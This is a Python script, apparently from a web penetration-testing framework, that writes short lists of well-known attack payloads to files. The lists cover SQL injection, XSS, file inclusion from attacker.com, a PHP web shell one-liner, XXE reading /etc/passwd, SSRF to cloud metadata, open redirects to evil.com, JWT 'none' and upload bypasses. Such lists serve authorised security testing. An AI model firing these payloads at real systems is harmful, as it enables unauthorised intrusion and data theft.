#!/usr/bin/env python3
import os

def create_all_payloads():
    # Create payloads directory
    os.makedirs("payloads", exist_ok=True)
    os.makedirs("results", exist_ok=True)
    os.makedirs("reports", exist_ok=True)
    
    # Dictionary of all payloads
    payloads_dict = {
        "sqli.txt": [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            # ... (all SQLi payloads)
        ],
        "xss.txt": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            # ... (all XSS payloads)
        ],
        "lfi.txt": [
            "../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            # ... (all LFI payloads)
        ],
        "rfi.txt": [
            "http://attacker.com/shell.txt",
            "https://raw.githubusercontent.com/shell.php",
            # ... RFI payloads
        ],
        "command_injection.txt": [
            ";id",
            "|ls -la",
            # ... command injection
        ],
        "rce.txt": [
            "<?php system($_GET['cmd']); ?>",
            "eval(\"__import__('os').system('id')\")",
            # ... RCE payloads
        ],
        "xxe.txt": [
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            # ... XXE payloads
        ],
        "ssrf.txt": [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:22",
            # ... SSRF payloads
        ],
        "crlf.txt": [
            "test%0d%0aHeader: value",
            "%0d%0aX-Injected: header",
            # ... CRLF payloads
        ],
        "open_redirect.txt": [
            "https://evil.com",
            "//evil.com",
            # ... redirect payloads
        ],
        "ssti.txt": [
            "{{7*7}}",
            "${7*7}",
            # ... SSTI payloads
        ],
        "idor.txt": [
            "/api/user/1",
            "/admin/view?id=1",
            # ... IDOR patterns
        ],
        "csrf.txt": [
            "<form action='http://target.com/delete' method='POST'>",
            # ... CSRF payloads
        ],
        "file_upload.txt": [
            "shell.php.jpg",
            "test.pHp",
            # ... upload bypass
        ],
        "cors.txt": [
            "Origin: https://evil.com",
            "Origin: null",
            # ... CORS payloads
        ],
        "jwt.txt": [
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0",
            # ... JWT payloads
        ],
        "traversal.txt": [
            "../../../",
            "..\\..\\",
            # ... traversal payloads
        ]
    }
    
    # Create each payload file
    for filename, payloads in payloads_dict.items():
        with open(f"payloads/{filename}", "w") as f:
            f.write("# " + filename.upper().replace(".TXT", "") + " Payloads\n")
            f.write("# Created by Pentest-Web Framework\n\n")
            for payload in payloads:
                f.write(payload + "\n")
        
        print(f"[+] Created: payloads/{filename}")
    
    # Create empty results directories
    with open("results/.gitkeep", "w") as f:
        f.write("")
    with open("reports/.gitkeep", "w") as f:
        f.write("")
    
    print("\n[✓] All payload files created successfully!")
    print("[✓] Results and reports directories ready")

if __name__ == "__main__":
    create_all_payloads()
